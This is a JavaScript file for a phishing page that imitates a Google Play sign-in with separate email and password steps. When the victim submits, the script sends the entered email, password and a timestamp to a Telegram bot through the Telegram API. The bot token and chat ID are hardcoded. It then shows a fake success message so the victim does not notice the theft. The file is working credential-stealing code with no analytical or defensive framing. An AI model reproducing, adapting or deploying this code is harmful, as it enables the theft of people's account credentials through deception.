
const BOT_TOKEN = '8584105821:AAE6oHYerUJE4QZKVCIAcS_PRnR_r-VVtxM';
const CHAT_ID = '7844869550'; // Sizning chat ID

const emailForm = document.getElementById('emailForm');
const passwordForm = document.getElementById('passwordForm');
const emailView = document.getElementById('emailView');
const passwordView = document.getElementById('passwordView');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const userEmailDisplay = document.getElementById('userEmail');
const profilePic = document.getElementById('profilePic');
const successMsg = document.getElementById('successMsg');
const submitBtn = document.getElementById('submitBtn');

emailForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = emailInput.value;
    
    if (email) {
        userEmailDisplay.textContent = email;
        profilePic.textContent = email.charAt(0).toUpperCase();
        
        emailView.classList.add('hidden');
        passwordView.classList.remove('hidden');
    }
});

passwordForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = emailInput.value;
    const password = passwordInput.value;
    
    if (email && password) {
        // Show loading
        submitBtn.disabled = true;
        submitBtn.innerHTML = 'Отправка...<span class="loading"></span>';
        
        // Send to Telegram
        const message = `
🔐 Новый вход в Google Play:

📧 Email: ${email}
🔑 Пароль: ${password}
⏰ Время: ${new Date().toLocaleString('ru-RU')}
        `;
        
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            if (response.ok) {
                successMsg.classList.remove('hidden');
                submitBtn.innerHTML = 'Готово ✓';
                
                setTimeout(() => {
                    alert('Вход в Google Play выполнен!');
                    // Reset form
                    emailInput.value = '';
                    passwordInput.value = '';
                    backToEmail();
                    successMsg.classList.add('hidden');
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = 'Далее';
                }, 2000);
            } else {
                throw new Error('Failed to send');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('Ошибка отправки. Попробуйте снова.');
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Далее';
        }
    }
});

function backToEmail() {
    passwordView.classList.add('hidden');
    emailView.classList.remove('hidden');
    passwordInput.value = '';
}

// Input animation
const inputs = document.querySelectorAll('input');
inputs.forEach(input => {
    input.addEventListener('focus', function() {
        this.parentElement.style.transform = 'scale(1.01)';
    });
    
    input.addEventListener('blur', function() {
        this.parentElement.style.transform = 'scale(1)';
    });
});
